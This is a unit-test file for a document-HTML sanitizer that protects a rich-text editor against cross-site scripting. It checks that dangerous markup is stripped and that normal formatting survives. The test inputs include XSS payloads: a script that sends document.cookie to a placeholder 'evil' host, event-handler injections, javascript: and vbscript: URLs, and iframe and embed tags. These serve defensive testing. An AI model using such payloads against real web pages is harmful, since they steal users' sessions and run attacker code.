// Unit tests for the document-HTML sanitizer (the XSS trust boundary for the
// Word-editor body). Run:
//   node --experimental-strip-types --experimental-loader ./scripts/ts-ext-hook.mjs scripts/sanitize-html.test.ts
import { sanitizeDocHtml, isUnsafeDocHtml } from "../src/lib/sanitize-html.ts";

let pass = 0, fail = 0;
const ok = (name: string, cond: boolean, info = "") => {
  if (cond) pass++;
  else { fail++; console.error("✗ " + name + (info ? ` — ${info}` : "")); }
};
const has = (h: string, s: string) => h.includes(s);
const gone = (h: string, s: string) => !h.toLowerCase().includes(s.toLowerCase());

// ── strips active content ─────────────────────────────────────────────────────
ok("removes <script> blocks and their content",
  gone(sanitizeDocHtml(`<p>hi</p><script>fetch('//evil?'+document.cookie)</script>`), "fetch"));
ok("removes onerror handler on img",
  gone(sanitizeDocHtml(`<img src=x onerror="alert(document.cookie)">`), "onerror"));
ok("removes onload on svg",
  gone(sanitizeDocHtml(`<svg onload=alert(1)></svg>`), "onload"));
ok("removes onclick with single quotes",
  gone(sanitizeDocHtml(`<div onclick='steal()'>x</div>`), "onclick"));
ok("removes onmouseover with unquoted value",
  gone(sanitizeDocHtml(`<a onmouseover=go()>x</a>`), "onmouseover"));
ok("neutralizes javascript: href",
  gone(sanitizeDocHtml(`<a href="javascript:alert(1)">x</a>`), "javascript:"));
ok("neutralizes vbscript: src",
  gone(sanitizeDocHtml(`<img src="vbscript:msgbox">`), "vbscript:"));
ok("defangs data:text/html",
  gone(sanitizeDocHtml(`<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>`), "text/html"));
ok("removes <iframe>",
  gone(sanitizeDocHtml(`<iframe src="//evil"></iframe>`), "<iframe"));
ok("removes <object> and <embed>",
  gone(sanitizeDocHtml(`<object data="x"></object><embed src="y">`), "<object") &&
  gone(sanitizeDocHtml(`<embed src="y">`), "<embed"));

// ── keeps legitimate formatting ───────────────────────────────────────────────
const rich = `<h2 class="sec">Раздел</h2><p style="color:#9e2b2b">текст <strong>bold</strong></p>` +
  `<table class="ptable"><tr><td>a</td><td>b</td></tr></table><ul><li>x</li></ul>`;
ok("keeps headings/paragraphs/strong", has(sanitizeDocHtml(rich), "<strong>bold</strong>"));
ok("keeps style attribute (formatting)", has(sanitizeDocHtml(rich), 'style="color:#9e2b2b"'));
ok("keeps tables", has(sanitizeDocHtml(rich), '<table class="ptable">'));
ok("keeps Cyrillic content intact", has(sanitizeDocHtml(rich), "Раздел"));
ok("keeps http links", has(sanitizeDocHtml(`<a href="https://ptsbg.eu">site</a>`), 'href="https://ptsbg.eu"'));
ok("keeps mailto links", has(sanitizeDocHtml(`<a href="mailto:x@y.bg">m</a>`), "mailto:x@y.bg"));
ok("keeps data:image base64 (inline images)",
  has(sanitizeDocHtml(`<img src="data:image/png;base64,iVBORw0KGgo=">`), "data:image/png;base64,iVBORw0KGgo="));
ok("keeps https image URLs (uploaded photos)",
  has(sanitizeDocHtml(`<img src="https://x.supabase.co/a.png" style="width:60mm">`), "https://x.supabase.co/a.png"));
ok("preserves HTML comment markers (BODY/COVER)",
  has(sanitizeDocHtml(`<!--PTS:CV-->\n<p>x</p>`), "<!--PTS:CV-->"));

// ── the property that matters: sanitize is idempotent + flags unsafe input ──────
const dirty = `<p>ok</p><img src=x onerror=alert(1)><script>bad()</script>`;
const once = sanitizeDocHtml(dirty);
ok("idempotent (second pass is a no-op)", sanitizeDocHtml(once) === once);
ok("clean input is unchanged", sanitizeDocHtml(rich) === rich, "sanitizer must not rewrite safe HTML");
ok("isUnsafeDocHtml true for handler", isUnsafeDocHtml(dirty));
ok("isUnsafeDocHtml false for clean", !isUnsafeDocHtml(rich));
ok("empty/nullish safe", sanitizeDocHtml("") === "" && sanitizeDocHtml(null) === "" && sanitizeDocHtml(undefined) === "");

console.log(`\nsanitize-html.test: ${pass} passed, ${fail} failed`);
if (fail) process.exitCode = 1;
